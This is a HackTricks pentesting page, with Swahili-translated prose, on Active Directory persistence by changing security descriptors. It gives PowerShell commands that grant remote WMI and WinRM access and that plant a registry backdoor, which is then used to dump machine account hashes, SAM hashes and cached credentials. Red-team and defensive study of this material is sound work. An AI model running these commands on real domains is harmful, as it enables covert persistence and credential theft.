# Security Descriptors

{{#include ../../banners/hacktricks-training.md}}

## Security Descriptors

[From the docs](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): Lugha ya Mwelekeo wa Maelezo ya Usalama (SDDL) inaelezea muundo unaotumika kuelezea mwelekeo wa usalama. SDDL inatumia nyuzi za ACE kwa DACL na SACL: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`

Mwelekeo wa **usalama** unatumika **kuhifadhi** **idhini** ambazo **kitu** kina **juu** ya **kitu**. Ikiwa unaweza tu **kufanya** **mabadiliko madogo** katika **mwelekeo wa usalama** wa kitu, unaweza kupata haki za kuvutia sana juu ya hicho kitu bila kuhitaji kuwa mwanachama wa kundi lenye mamlaka.

Kisha, mbinu hii ya kudumu inategemea uwezo wa kushinda kila haki inayohitajika dhidi ya vitu fulani, ili uweze kutekeleza kazi ambayo kwa kawaida inahitaji mamlaka ya admin lakini bila kuhitaji kuwa admin.

### Access to WMI

You can give a user access to **execute remotely WMI** [**using this**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1):
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```
### Access to WinRM

Mpe **mtumiaji ufikiaji wa winrm PS console** [**kwa kutumia hii**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### Remote access to hashes

Fikia **registry** na **dump hashes** ukitengeneza **Reg backdoor using** [**DAMP**](https://github.com/HarmJ0y/DAMP)**,** ili uweze wakati wowote kupata **hash ya kompyuta**, **SAM** na yoyote **cached AD** credential kwenye kompyuta. Hivyo, ni muhimu sana kutoa ruhusa hii kwa **mtumiaji wa kawaida dhidi ya kompyuta ya Domain Controller**:
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
Angalia [**Silver Tickets**](silver-ticket.md) kujifunza jinsi unavyoweza kutumia hash ya akaunti ya kompyuta ya Msimamizi wa Kikoa.

{{#include ../../banners/hacktricks-training.md}}
